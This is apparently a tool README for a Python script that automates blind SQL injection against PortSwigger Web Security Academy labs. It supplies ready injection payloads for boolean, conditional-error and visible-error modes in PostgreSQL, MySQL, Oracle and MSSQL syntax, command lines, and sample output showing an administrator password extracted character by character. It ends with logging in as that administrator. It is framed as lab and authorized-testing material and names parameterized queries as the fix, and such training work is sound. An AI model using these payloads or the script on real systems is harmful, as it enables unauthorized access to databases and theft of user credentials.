# 10 - Blind SQL Injection (Boolean, Error, Error-Visible)

## Purpose
Extract sensitive data from a database when results are not returned directly. Supports three detection techniques across four database dialects.

## Lab Context
**Platform**: PortSwigger Web Security Academy  
**Lab types**:
- Blind SQLi with conditional responses → `--mode boolean`
- Blind SQLi with conditional errors → `--mode error`
- Visible error-based SQLi → `--mode error-visible`

This skill does **not** require discovery phase JSON files. It operates directly against a lab URL with valid session and TrackingId cookies.

## How It Works

### Mode: `boolean` (iterative)
Injects a true/false condition and checks for `"Welcome back"` in the response body. One request per character candidate.
```
TrackingId=<id>' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{char}'--
```

### Mode: `error` (iterative)
Forces a DB error (divide-by-zero) when the condition is true. Oracle = HTTP 500, safe = HTTP 200.
```
TrackingId=<id>'||(SELECT CASE WHEN (SUBSTR(password,{pos},1)='{char}') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND rownum=1)--
```

### Mode: `error-visible` (one-shot)
Triggers a type-conversion error that reflects the full plaintext value in the error message. One request total.

| `--db`       | Payload                                                                 | Error pattern              |
|--------------|-------------------------------------------------------------------------|----------------------------|
| `postgresql` | `'\|\|(SELECT CAST(password AS int) FROM users WHERE username='...')--` | `integer: "(.+?)"`         |
| `mysql`      | `' AND extractvalue(1,concat(0x7e,(SELECT password FROM users ...)))--` | `~(.+)`                    |
| `oracle`     | `'\|\|(SELECT TO_NUMBER(password) FROM users WHERE username='...')--`   | `invalid number "(.+?)"`   |
| `mssql`      | `'+(SELECT CONVERT(int,password) FROM users WHERE username='...')--`    | `value '(.+?)'`            |

### DB dialect (`--db`)
Controls which substring function is used in iterative modes:

| `--db`       | Function     |
|--------------|--------------|
| `postgresql` | `SUBSTRING`  |
| `mysql`      | `SUBSTRING`  |
| `mssql`      | `SUBSTRING`  |
| `oracle`     | `SUBSTR`     |

## Setup

1. **Open the lab** in your browser
2. **Grab both cookies** from DevTools → Application → Cookies: `session` and `TrackingId`
3. **Copy the lab URL** (e.g. `https://LABID.web-security-academy.net/`)

## Commands

**Boolean oracle, PostgreSQL (default):**
```bash
python3 scripts/10_blind_sqli.py \
  --url https://LABID.web-security-academy.net/ \
  --session <val> \
  --tracking-id <val>
```

**Error-blind oracle, Oracle DB:**
```bash
python3 scripts/10_blind_sqli.py \
  --url https://LABID.web-security-academy.net/ \
  --session <val> \
  --tracking-id <val> \
  --mode error \
  --db oracle
```

**Error-visible one-shot, PostgreSQL:**
```bash
python3 scripts/10_blind_sqli.py \
  --url https://LABID.web-security-academy.net/ \
  --session <val> \
  --tracking-id <val> \
  --mode error-visible \
  --verbose
```

**Error-visible with custom parse pattern:**
```bash
python3 scripts/10_blind_sqli.py \
  --url https://LABID.web-security-academy.net/ \
  --session <val> \
  --tracking-id <val> \
  --mode error-visible \
  --parse-error 'value "(.+?)"'
```

**Enumerate by row offset instead of username (short cookie workaround):**
```bash
python3 scripts/10_blind_sqli.py \
  --url https://LABID.web-security-academy.net/ \
  --session <val> \
  --tracking-id <val> \
  --mode error-visible \
  --user-offset 0
```

## Expected Output

**Iterative modes:**
```
[*] Target : https://LABID.web-security-academy.net/filter?category=Gifts
[*] Mode   : boolean
[*] DB     : postgresql
[*] Filter : username='administrator'
[*] Max len: 30 chars

  Position 01: s  →  s
  Position 02: e  →  se
  ...
  Position 16: 4  →  secret1234abc5d34

[*] No match at position 17 — extraction complete.

[+] Password: secret1234abc5d34
```

**Error-visible mode:**
```
[*] Target : https://LABID.web-security-academy.net/filter?category=Gifts
[*] Mode   : error-visible
[*] DB     : postgresql
[*] Filter : username='administrator'
[*] Pattern: integer: "(.+?)"

[+] Password: secret1234abc5d34
```

## Flags Reference

| Flag | Default | Notes |
|------|---------|-------|
| `--mode` | `boolean` | `boolean` \| `error` \| `error-visible` |
| `--db` | `postgresql` | `postgresql` \| `mysql` \| `oracle` \| `mssql` |
| `--username-filter` | `administrator` | Username for WHERE clause |
| `--user-offset N` | — | Use `LIMIT 1 OFFSET N` instead of WHERE. Use when WHERE makes cookie too long |
| `--parse-error REGEX` | per-db default | Custom regex to parse value from error response |
| `--verbose` | off | Print raw response body (error-visible only) |

## Vulnerable vs. Safe

**Boolean — true condition:** `HTTP 200` + `"Welcome back"` in body  
**Error-blind — true condition:** `HTTP 500`  
**Error-visible — vulnerable:** DB error message contains plaintext value  
**Patched (any mode):** Parameterized queries — injected SQL is never evaluated

## Safety Notes

- **Sandboxed lab only** — for PortSwigger labs and authorized engagements only
- Not for use against real targets without explicit written authorization
- The lab resets on expiry; grab fresh cookie values if requests start failing
- No rate limiting needed for PortSwigger labs, but add `time.sleep(0.1)` if you hit connection errors

## Execution Time

- **Iterative modes**: ~3–8 min (worst case: 30 × 36 = 1080 requests)
- **Error-visible**: ~1 second (single request)

## Next Step

After retrieving the password, log in as `administrator` via `/login` to confirm the finding and complete the lab.
